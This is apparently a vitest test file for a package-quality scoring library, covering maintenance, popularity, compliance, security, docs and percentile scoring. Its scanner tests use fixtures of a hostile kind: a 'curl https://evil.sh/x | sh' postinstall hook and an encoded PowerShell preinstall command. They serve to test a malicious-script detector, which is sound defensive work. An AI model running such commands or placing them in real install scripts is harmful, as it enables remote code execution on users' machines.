import { describe, expect, it } from "vitest";
import {
  computeScore,
  percentile,
  scanInstallScripts,
  scoreCompliance,
  scoreDocs,
  scoreMaintenance,
  scorePopularity,
  scoreSecurity,
} from "@/lib/scoring";

const NOW = new Date("2026-08-25T00:00:00Z");
const daysAgo = (n: number) => new Date(NOW.getTime() - n * 86_400_000);

describe("scoreMaintenance (0-30)", () => {
  it("full score for commits within 30 days", () => {
    expect(scoreMaintenance(daysAgo(0), NOW)).toBe(30);
    expect(scoreMaintenance(daysAgo(29), NOW)).toBe(30);
  });
  it("decays with a 180-day half-life", () => {
    expect(scoreMaintenance(daysAgo(210), NOW)).toBeCloseTo(15, 0);
    expect(scoreMaintenance(daysAgo(390), NOW)).toBeCloseTo(7.5, 0);
  });
  it("scores 0 with no commit history", () => {
    expect(scoreMaintenance(null, NOW)).toBe(0);
  });
});

describe("scorePopularity (0-25)", () => {
  it("uses full weight when only star percentile is available", () => {
    expect(scorePopularity(1, null)).toBe(25);
    expect(scorePopularity(0.5, null)).toBe(12.5);
    expect(scorePopularity(0, null)).toBe(0);
  });
  it("weights 60/40 when download data exists", () => {
    expect(scorePopularity(1, 0)).toBe(15);
    expect(scorePopularity(0, 1)).toBe(10);
    expect(scorePopularity(1, 1)).toBe(25);
  });
  it("clamps out-of-range input", () => {
    expect(scorePopularity(1.5, null)).toBe(25);
    expect(scorePopularity(-1, null)).toBe(0);
  });
});

describe("scoreCompliance (0-20)", () => {
  it("passes validation 20 / manifest but failed 8 / no manifest 0", () => {
    expect(scoreCompliance(true, true)).toBe(20);
    expect(scoreCompliance(false, true)).toBe(8);
    expect(scoreCompliance(false, false)).toBe(0);
  });
});

describe("scoreSecurity (0-15)", () => {
  it("license 6 + no suspicious scripts 5 + verified owner 4 = 15", () => {
    expect(
      scoreSecurity({ hasLicense: true, suspiciousInstallScript: false, verifiedOwner: true }),
    ).toBe(15);
  });
  it("suspicious install script costs 5 points", () => {
    expect(
      scoreSecurity({ hasLicense: true, suspiciousInstallScript: true, verifiedOwner: false }),
    ).toBe(6);
  });
});

describe("scoreDocs (0-10)", () => {
  it("long README + structure + examples scores full marks", () => {
    expect(
      scoreDocs({ readmeLength: 2000, readmeHasCodeExample: true, readmeHasStructure: true }),
    ).toBe(10);
  });
  it("no README scores 0", () => {
    expect(
      scoreDocs({ readmeLength: 0, readmeHasCodeExample: false, readmeHasStructure: false }),
    ).toBe(0);
  });
});

describe("computeScore composition", () => {
  it("perfect scenario = 100", () => {
    const { total, breakdown } = computeScore({
      lastCommitAt: daysAgo(1),
      starsPercentile: 1,
      downloadsPercentile: null,
      specValid: true,
      hasManifest: true,
      hasLicense: true,
      suspiciousInstallScript: false,
      verifiedOwner: true,
      readmeLength: 5000,
      readmeHasCodeExample: true,
      readmeHasStructure: true,
      now: NOW,
    });
    expect(total).toBe(100);
    expect(breakdown).toEqual({
      maintenance: 30,
      popularity: 25,
      compliance: 20,
      security: 15,
      docs: 10,
    });
  });
  it("empty repository scenario scores low", () => {
    const { total } = computeScore({
      lastCommitAt: null,
      starsPercentile: 0,
      downloadsPercentile: null,
      specValid: false,
      hasManifest: false,
      hasLicense: false,
      suspiciousInstallScript: false,
      verifiedOwner: false,
      readmeLength: 0,
      readmeHasCodeExample: false,
      readmeHasStructure: false,
      now: NOW,
    });
    expect(total).toBe(5); // only the 5 points for "no suspicious scripts"
  });
});

describe("scanInstallScripts malicious pattern scan", () => {
  it("detects curl | sh", () => {
    expect(
      scanInstallScripts({ scripts: { postinstall: "curl https://evil.sh/x | sh" } }),
    ).toBe(true);
  });
  it("detects powershell -enc", () => {
    expect(
      scanInstallScripts({ scripts: { preinstall: "powershell -EncodedCommand SQBFAFgA" } }),
    ).toBe(true);
  });
  it("does not flag normal build scripts", () => {
    expect(
      scanInstallScripts({ scripts: { postinstall: "node ./scripts/setup.js", build: "tsc" } }),
    ).toBe(false);
    expect(scanInstallScripts(null)).toBe(false);
    expect(scanInstallScripts({})).toBe(false);
  });
});

describe("percentile", () => {
  it("per-ecosystem percentile", () => {
    const sorted = [1, 5, 10, 50, 100];
    expect(percentile(100, sorted)).toBe(1);
    expect(percentile(10, sorted)).toBe(0.6);
    expect(percentile(0, sorted)).toBe(0);
    expect(percentile(3, [])).toBe(0);
  });
});
